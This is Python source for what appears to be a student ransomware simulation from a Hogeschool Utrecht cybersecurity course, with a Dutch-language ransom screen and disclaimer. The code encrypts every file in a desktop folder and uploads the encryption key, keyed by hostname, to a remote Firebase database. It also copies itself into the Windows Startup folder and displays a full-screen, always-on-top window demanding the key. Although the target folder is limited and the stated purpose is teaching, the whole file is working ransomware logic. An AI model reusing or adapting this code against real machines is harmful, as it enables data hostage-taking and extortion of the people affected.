import os
import sys
import socket
import shutil
import winsound
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
from cryptography.fernet import Fernet
import firebase_admin
from firebase_admin import credentials, db

#CONFIG 

TARGET_FOLDER = os.path.join(os.path.expanduser("~"), "Desktop", "AD Ransomware Test")
ENCRYPTION_FLAG = os.path.join(TARGET_FOLDER, "encrypted.flag")

# FIREBASE

cred = credentials.Certificate("ad-cybersecurity-firebase-adminsdk-fbsvc-1d4636321b.json")
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://ad-cybersecurity-default-rtdb.europe-west1.firebasedatabase.app/'
})

# KEY GENERATION

if not os.path.exists(ENCRYPTION_FLAG):
    fernet_key = Fernet.generate_key()

    # Send to Firebase
    pc_name = socket.gethostname()
    ref = db.reference(f'/ransomware_keys/{pc_name}')
    ref.set({'key': fernet_key.decode()})

    # Save locally for educational simulation
    with open("encryption_key.txt", "wb") as f:
        f.write(fernet_key)
else:
    # Load existing key if folder already encrypted
    with open("encryption_key.txt", "rb") as f:
        fernet_key = f.read()

fernet = Fernet(fernet_key)

# ENCRYPTION 

def encrypt_folder():
    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith(".flag"):
                continue
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
            except Exception as e:
                print(f"Encrypt error in {file_path}: {e}")
    with open(ENCRYPTION_FLAG, "w") as f:
        f.write("ENCRYPTED")

if not os.path.exists(ENCRYPTION_FLAG):
    encrypt_folder()

# ADD TO STARTUP (Optional)

windowPath = os.path.abspath(sys.argv[0])
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
destination = os.path.join(startup_folder, "Ad Cybersecurity.exe")

if not os.path.exists(destination):
    try:
        shutil.copy(windowPath, destination)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

# DECRYPTION

def decrypt_folder():
    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith(".flag"):
                continue
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                decrypted_data = fernet.decrypt(data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
            except Exception as e:
                print(f"Failed to decrypt {file_path}: {e}")
    if os.path.exists(ENCRYPTION_FLAG):
        os.remove(ENCRYPTION_FLAG)

# GUI SETUP

windo = tk.Tk()
windo.geometry(f"{windo.winfo_screenwidth()}x{windo.winfo_screenheight()}")
windo.attributes("-topmost", True)
windo.config(background="red")
windo.title("Ransomware Simulator")

# GUI ACTION

def verify_key():
    entered = entry_field.get()
    try:
        if entered.encode() == fernet_key:
            decrypt_folder()
            messagebox.showinfo("Gelukt", "Sleutel correct. Bestanden zijn ontsleuteld.")
            windo.destroy()
        else:
            raise ValueError("Onjuiste sleutel.")
    except:
        winsound.Beep(500, 2000)
        messagebox.showerror("Fout", "Neem contact op met Ali & Caliyn om de juiste sleutel te krijgen ;)")

# GUI LAYOUT

# Image
imagePath = "Hogeschool-Utrecht.png"
img = Image.open(imagePath).resize((500, 300))
imgBackground = ImageTk.PhotoImage(img)
tk.Label(windo, image=imgBackground, bg="red").pack(pady=20)

# Entry
tk.Label(windo, text="Voer hier uw decoderingssleutel in.", bg="red", fg="white").pack(pady=20)
entry_field = tk.Entry(windo, width=50)
entry_field.pack(pady=20)
tk.Button(windo, text="Inloggen op het systeem", command=verify_key).pack(pady=10)

# Disclaimer
tk.Label(
    windo,
    text=(
        "Dit script is uitsluitend ontwikkeld voor educatieve doeleinden in het kader van een opdracht voor de "
        "sectie Cybersecurity aan de Hogeschool Utrecht. Het betreft een simulatie van ransomware en is niet bedoeld "
        "om daadwerkelijk schade aan te richten of om op enige wijze misbruikt te worden. Het gebruik, verspreiden of "
        "inzetten van dit script buiten de onderwijscontext is ten strengste verboden en kan juridische consequenties "
        "hebben. Dit script is gemaakt door Ali & Caliyn."
    ),
    bg="red",
    fg="white",
    wraplength=800,
    justify="center"
).pack(padx=20, pady=20)

windo.resizable(False, False)
windo.mainloop()